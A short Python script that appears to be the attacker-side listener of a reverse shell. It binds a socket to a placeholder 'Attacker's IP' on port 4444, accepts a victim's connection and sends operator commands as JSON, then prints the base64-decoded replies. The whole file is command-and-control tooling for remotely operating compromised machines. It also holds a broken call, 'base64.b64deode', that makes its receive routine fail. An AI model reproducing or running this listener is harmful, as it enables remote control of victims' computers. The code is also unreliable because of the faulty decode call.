import socket
import json
import base64

class Listener:

    def __init__(self, ip, port):
        self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.conn.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.conn.bind((ip, port))
        self.conn.listen(0)
        print("[+] Listener started on {}:{}".format(ip, port))
        self.connection, address = self.conn.accept()
        print("[+] Connection recieved from {}".format(address))


    def send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())


    def receive(self):
        json_result = ''
        while True:
            try:
                json_result += self.connection.recv(1024).decode()
                result = base64.b64deode(json.loads(json_result).encode()).decode()
                return result
            except ValueError:
                print("[!] Retrying to load the json")
                continue


    def run(self):
        while True:
            try:
                data = input(">>")
                self.send(data)
                result = self.receive()
                print(result)
            except KeyboardInterrupt:
                exit(0)


listener = Listener("Attacker's IP", 4444)
listener.run()